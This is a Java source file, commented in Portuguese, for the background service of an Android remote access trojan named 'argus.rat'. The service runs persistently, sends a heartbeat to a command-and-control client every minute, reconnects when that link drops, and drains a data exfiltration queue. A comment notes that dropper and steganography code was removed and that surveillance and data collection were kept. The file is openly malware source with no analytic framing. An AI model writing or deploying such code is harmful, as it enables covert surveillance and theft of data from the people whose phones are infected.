package com.argus.rat;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

/**
 * PayloadService - Serviço de operações em background (v.2.0 Simplificada)
 * REMOVIDO: Lógica de dropper, DexLoader, esteganografia
 * MANTIDO: Operações de monitoramento e coleta de dados
 */
public class PayloadService extends Service {
    private static final String TAG = "PayloadService";
    private static final long MONITORING_INTERVAL = 60000; // 1 minuto
    
    private C2Client c2Client;
    private DataExfiltrationManager exfiltrationManager;
    private PowerManagement powerManagement;
    private Handler handler;
    private boolean isRunning = false;
    private String deviceId;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "PayloadService criado (v.2.0)");
        
        // Inicializar componentes
        deviceId = DeviceIdentifier.getDeviceId(this);
        c2Client = C2Client.getInstance(this);
        exfiltrationManager = DataExfiltrationManager.getInstance(this);
        powerManagement = PowerManagement.getInstance(this);
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "PayloadService iniciado");
        
        if (!isRunning) {
            isRunning = true;
            startBackgroundOperations();
        }
        
        return START_STICKY;
    }

    /**
     * Inicia operações de monitoramento em background
     */
    private void startBackgroundOperations() {
        new Thread(() -> {
            try {
                Log.i(TAG, "Operações de background iniciadas");
                
                // Loop de monitoramento contínuo
                while (isRunning) {
                    try {
                        // 1. Coletar status do dispositivo
                        collectDeviceStatus();
                        
                        // 2. Verificar bateria
                        monitorBattery();
                        
                        // 3. Enviar heartbeat
                        sendHeartbeat();
                        
                        // 4. Processar fila de exfiltração
                        if (exfiltrationManager != null) {
                            exfiltrationManager.processQueue();
                        }
                        
                        // Aguardar próximo ciclo
                        Thread.sleep(MONITORING_INTERVAL);
                        
                    } catch (InterruptedException e) {
                        Log.w(TAG, "Thread de monitoramento interrompida");
                        break;
                    } catch (Exception e) {
                        Log.e(TAG, "Erro no ciclo de monitoramento", e);
                        Thread.sleep(MONITORING_INTERVAL);
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Erro fatal no serviço de background", e);
            }
        }).start();
    }

    /**
     * Coleta status geral do dispositivo
     */
    private void collectDeviceStatus() {
        try {
            // Informações do dispositivo já são enviadas periodicamente
            Log.d(TAG, "Status do dispositivo coletado");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao coletar status", e);
        }
    }

    /**
     * Monitora nível de bateria
     */
    private void monitorBattery() {
        try {
            if (powerManagement != null) {
                float batteryLevel = powerManagement.getBatteryLevel();
                boolean isCharging = powerManagement.isDeviceCharging();
                
                Log.d(TAG, String.format("Bateria: %.1f%% (Carregando: %s)", 
                    batteryLevel, isCharging));
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao monitorar bateria", e);
        }
    }

    /**
     * Envia heartbeat para manter conexão
     */
    private void sendHeartbeat() {
        try {
            if (c2Client != null && c2Client.isConnected()) {
                c2Client.sendHeartbeat();
                Log.d(TAG, "Heartbeat enviado");
            } else {
                Log.w(TAG, "C2Client não conectado, tentando reconectar...");
                // Tentar reconectar
                if (c2Client != null) {
                    c2Client.initialize(deviceId);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar heartbeat", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        
        Log.d(TAG, "PayloadService destruído");
    }
}